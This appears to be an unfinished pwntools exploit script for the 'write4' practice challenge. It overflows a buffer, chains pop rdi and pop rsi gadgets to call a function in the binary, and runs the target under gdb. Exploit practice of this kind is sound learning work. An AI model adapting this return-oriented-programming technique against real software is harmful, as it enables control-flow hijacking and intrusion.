from pwn import *

context.arch = "amd64"

rdiGadget = 0x0000000000400693 # pop rdi; ret
rsiGadget = 0x0000000000400691 # pop rsi; pop r15; ret
rdxGadget = 0

elf = ELF("./write4")
lib = ELF("./libwrite4.so")
#p = elf.process()
p = gdb.debug("./write4", "b usefulFunction\nc")

rop = ROP(elf)
rop.raw(b"A"*(40))
#rop.call(lib.symbols["read"], [ 0x1, 0x4006b4, 0x10 ])
rop.call(elf.symbols["usefulFunction"], [])
rop.raw(b"B"*130)


p.recvuntil("> ")
p.sendline(rop.chain())
p.sendline(p64(0x4006b4 + 10))

print(p.recvall())
